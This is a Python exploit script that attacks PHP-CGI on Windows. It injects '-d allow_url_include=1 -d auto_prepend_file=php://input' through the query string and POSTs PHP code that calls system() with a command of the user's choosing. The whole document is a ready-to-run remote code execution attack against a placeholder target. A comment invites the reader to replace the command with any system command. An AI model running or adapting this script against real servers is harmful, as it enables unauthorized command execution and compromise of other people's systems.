import requests
import urllib.parse

# Target URL running PHP-CGI on Windows
TARGET_URL = 'http://target-site/cgi-bin/php-cgi.exe'

# Payload to execute system commands
CMD = 'whoami'  # Replace with any system command
PAYLOAD = f'-d allow_url_include=1 -d auto_prepend_file="php://input"'

# Encoded Unicode Payload to bypass filters (conceptual example)
encoded_payload = urllib.parse.quote(PAYLOAD)

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Sending the crafted request with malicious payload
data = f'<?php system("{CMD}"); ?>'
url = f'{TARGET_URL}?{encoded_payload}'

print(f"[*] Sending request to {url}")
response = requests.post(url, headers=headers, data=data)

if response.status_code == 200:
    print("[+] Exploit sent successfully")
    print("[+] Response:")
    print(response.text)
else:
    print("[-] Exploit failed")
    print(response.status_code, response.reason)
